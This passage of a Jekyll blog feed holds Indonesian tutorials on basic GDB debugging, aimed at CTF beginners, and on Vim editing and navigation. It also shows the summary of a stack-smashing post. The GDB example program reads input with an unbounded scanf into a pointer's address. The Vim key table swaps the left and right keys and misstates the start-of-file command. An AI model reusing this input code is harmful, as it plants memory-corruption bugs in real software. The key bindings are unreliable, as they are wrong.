+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-dxh30-tech-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+&lt;/script&gt;
+
+&lt;noscript&gt;Please enable JavaScript to view the &lt;a href=&quot;https://disqus.com/?ref_noscript&quot;&gt;comments powered by Disqus.&lt;/a&gt;&lt;/noscript&gt;</content><author><name>Didik</name></author><summary type="html">Stack smashing merupakan teknik yang dapat digunakan untuk bisa berkeliaran diluar fungsi atau variabel. Langsung saja kita ke tutorial stack smashing. Diketahui kode berikut ini : beri nama oke.c</summary></entry><entry><title type="html">Tutorial GDB 1</title><link href="http://localhost:4000/jekyll/update/2019/04/11/gdb-tutorial-1.html" rel="alternate" type="text/html" title="Tutorial GDB 1" /><published>2019-04-11T00:00:00+08:00</published><updated>2019-04-11T00:00:00+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/11/gdb-tutorial-1</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/11/gdb-tutorial-1.html">&lt;p&gt;GDB (Gnu Debugger) dapat dimanfaatkan dengan menambah flag -g saat mengkompile program. Tutorial singkatnya&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;Buat program dengan nama hello.c&lt;/p&gt;
+
+    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+ &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+     &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Insert name : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Save program lalu compile dengan menggunakan flag -g di gcc&lt;/p&gt;
+
+    &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt; user@localhost:~$&lt;/span&gt; gcc &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; hello.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; hello
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Setelah itu debug programmnya dengan gdb&lt;/p&gt;
+
+    &lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt; user@localhost:~$&lt;/span&gt; gdb ./hello
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Untuk menjalankan program ketikkan run&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) run
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Agar bisa di debug programmnya ketikkan start, dimana perintah ini melakukan debug dengan breakpoint di fungsi main&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) start
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Untuk melihat isi program, gunakan perintah&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) list
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Untuk melihat isi register saat ini, gunakan perintah&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) info registers
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Coba lanjutkan program, dengan ketikkan&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) continue
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Maka program akan langsung berlanjut sampai selesai, coba start ulang program, dan ikuti perintah berikut&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) start
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) info registers
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) next
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt; (gdb) info reg
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Bisa dilihat perbedaan, di register rip, saat dilanjutkan alamatnya berubah, disini rip maksudnya adalah INSTRUCTION POINTER, atau bahasa gampangnya PROGRAM COUNTER. Untuk melihat isi dari alamat memori dapat menggunakan perintah x (Examine Memory), disini saya ngeprint alamat dari Register rip.&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) x 0x555555555161
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Untuk melihat kedepan memory, ketikkan perintah x/4 untuk 4 byte kedepan memori&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) x/4 0x555555555161
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Untuk melihat kebelakang memory, ketikkan perintah x/-4 untuk 4 byte kebelakang memori&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) x/-4 0x555555555161
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Disini kita coba loncatin printf dan scanf yang pertama, kita lihat apa yang terjadi&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) continue
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) start
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) next
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) next
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) next
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;Insert Name : ABC
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) info registers
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Lihat rip nya dimana&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;rax            0x1                 1
+rbx            0x0                 0
+rcx            0x7ffff7f203e0      140737353221088
+rdx            0x7ffff7f71730      140737353553712
+rsi            0x1                 1
+rdi            0x0                 0
+rbp            0x7fffffffd6b0      0x7fffffffd6b0
+rsp            0x7fffffffd6a0      0x7fffffffd6a0
+r8             0xa                 10
+r9             0x0                 0
+r10            0x0                 0
+r11            0x7ffff7f203e0      140737353221088
+r12            0x555555555060      93824992235616
+r13            0x7fffffffd790      140737488344976
+r14            0x0                 0
+r15            0x0                 0
+rip            0x555555555199      0x555555555199 &amp;lt;main+64&amp;gt;
+eflags         0x206               [ PF IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Dari hasil keluaran perintah diatas, dapat diketahui isi dari rip nya adalah 0x555555555199, jadi kita continue lagi, terus start&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) continue
+&lt;/code&gt;&lt;/pre&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) start
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Kita coba ganti konten rip dengan cara (disini tanda $ menandakan register)&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) set $rip=0x555555555199
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Coba dilihat yang sudah kita ganti, dengan cara&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) info registers
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Dapat dilihat rip nya berubah menjadi 0x555555555199, coba next&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;(gdb) next
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Maka akan muncul&lt;/p&gt;
+
+    &lt;pre&gt;&lt;code class=&quot;language-gdb&quot;&gt;Hello �����
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Cukup itu untuk dasar-dasar gdb, kalau kurang ditunggu Tutorial selanjutnya. Pemahaman gdb sangat dibutuhkan untuk memulai CTF, karena bakal banyak kepake ilmunya&lt;/p&gt;</content><author><name>Didik</name></author><summary type="html">GDB (Gnu Debugger) dapat dimanfaatkan dengan menambah flag -g saat mengkompile program. Tutorial singkatnya</summary></entry><entry><title type="html">Vim Bagian 1</title><link href="http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-1.html" rel="alternate" type="text/html" title="Vim Bagian 1" /><published>2019-04-10T00:00:00+08:00</published><updated>2019-04-10T00:00:00+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-1</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-1.html">&lt;h2 id=&quot;tutorial-vim-1-basic-editing&quot;&gt;Tutorial Vim 1 Basic Editing&lt;/h2&gt;
+&lt;p&gt;Editor vim biasanya dapat ditemukan di Linux pada umumnya. Namun jika tidak ditemukan dengan nama vim, dapat dibuka dengan perintah&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; vi namafile
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Coba keluar dari vim dengan cara mengketik colon(:) lalu q, btw &amp;lt;RET&amp;gt; disini maksudnya enter&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;:q &amp;lt;RET&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Coba ketikkan script hello world ini, untuk memulai ngetik, ubah ke INSERT Mode dengan menekan tombol i&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; vi hello.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Setelah dalam mode INSERT. Ketikkan (jangan copy paste)&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello World&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Untuk keluar dari mode INSERT ke mode NORMAL tekan &amp;lt;ESC&amp;gt;&lt;/p&gt;
+
+&lt;p&gt;Setelah dalam mode NORMAL. Untuk menyimpan file. Ketikkan&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;:w &amp;lt;RET&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lalu untuk keluar dari vim. Ketikkan&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;:q &amp;lt;RET&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Atau bisa juga sekalian&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;:wq &amp;lt;RET&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Untuk menyimpan dengan nama lain, atau tidak sengaja ketik perintah vim tanpa namafile&lt;/p&gt;
+
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;:wq sesuatu.c &amp;lt;RET&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Segini saja sudah cukup untuk menggunakan vim untuk keperluan editting teks biasa (.txt) atau koding ringan.&lt;/p&gt;
+
+&lt;p&gt;Tutorial selanjutnya adalah cara navigasi di vim&lt;/p&gt;
+
+&lt;p&gt;Tips vim Hang :&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Jika tidak sengaja menekan C-s, dapat dilepas dengan menggunakan C-q.
+Btw fitur ini namanya &lt;a href=&quot;https://en.wikipedia.org/wiki/Software_flow_control&quot;&gt;Software Flow Control&lt;/a&gt; ( buat yang sering program Serial mungkin ngerti) (coba penjet C-s di terminal ;) )&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div id=&quot;disqus_thread&quot;&gt;&lt;/div&gt;
+&lt;script&gt;
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-dxh30-tech-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+&lt;/script&gt;
+
+&lt;noscript&gt;Please enable JavaScript to view the &lt;a href=&quot;https://disqus.com/?ref_noscript&quot;&gt;comments powered by Disqus.&lt;/a&gt;&lt;/noscript&gt;</content><author><name>Didik</name></author><summary type="html">Tutorial Vim 1 Basic Editing Editor vim biasanya dapat ditemukan di Linux pada umumnya. Namun jika tidak ditemukan dengan nama vim, dapat dibuka dengan perintah</summary></entry><entry><title type="html">Vim Bagian 2</title><link href="http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-2.html" rel="alternate" type="text/html" title="Vim Bagian 2" /><published>2019-04-10T00:00:00+08:00</published><updated>2019-04-10T00:00:00+08:00</updated><id>http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-2</id><content type="html" xml:base="http://localhost:4000/jekyll/update/2019/04/10/vim-tutorial-2.html">&lt;h2 id=&quot;tutorial-vim-2-navigasi&quot;&gt;Tutorial Vim 2 Navigasi&lt;/h2&gt;
+&lt;p&gt;Untuk memanfaatkan navigasi di Vim coba buka file hello.c tadi atau file yang lain. 
+Disini saya mulai pakai Vim, untuk cara install vim dapat dilihat di distro masing-masing ;)&lt;/p&gt;
+&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;user@localhost:~$&lt;/span&gt; vim hello.c 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Isinya :&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Hello World!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;untuk memanfaatkan keyboard sepenuhnya (pure keyboard) navigasi di vim sama seperti navigasi standard buat yang sering maen game Rogue (contoh : StoneSoup). yakni&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;tombol&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;keterangan&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;h&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;kanan&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;j&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;bawah&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;k&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;atas&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;l&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;kiri&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;tombol perlu diingat kalau perlu sering-sering maen game roguelike, karena hampir semua navigasi tanpa tombol kursor mengandalkan kursor diatas. Hal ini juga penting biar tangan gak nyasar kalau pakai tombol kursor&lt;/p&gt;
+
+&lt;p&gt;Tapi mungkin yang biasa kita cari itu yang efisien untuk ngoding ya (yang diatas itu tombol navigasi standar).&lt;/p&gt;
+
+&lt;p&gt;Untuk itu mungkin tombol dibawah ini berguna, huruf besar disini maksudnya pencet &lt;em&gt;shift&lt;/em&gt; dulu. Contoh: G itu sama dengan S-g&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;tombol&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;keterangan&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;e&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Maju ke akhir kata&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;b&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mundur ke awal kata&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;w&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Maju 1 kata&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;$&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Maju ke akhir (end)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;0&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mundur ke awal (home)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;)&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Maju 1 kalimat&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;(&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mundur 1 kalimat&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;}&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Maju 1 paragraf&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;{&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mundur 1 paragraf&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;G&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Maju ke akhir file (EOF)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;g&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mundur ke awal file (BOF)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;%&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Buat programmer (bracket match)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;H&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mundur ke bagian paling atas layar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;M&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Ke tengah layar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;L&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Maju ke bagian paling bawah layar&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Coba aja pencet-pencet setiap perintah diatas biar ngerti. Sampai situ saja untuk navigasi. Masih banyak cara mengefisiensi waktu editting file. Di tutorial selanjutnya akan dibahas cara menggunakan macros di Vim ;)&lt;/p&gt;
+
+&lt;h2 id=&quot;tips&quot;&gt;Tips&lt;/h2&gt;
+&lt;p&gt;Semua navigasi ini dilakukan pada mode NORMAL&lt;/p&gt;
+&lt;div id=&quot;disqus_thread&quot;&gt;&lt;/div&gt;
+&lt;script&gt;
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://blog-dxh30-tech-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+&lt;/script&gt;
+
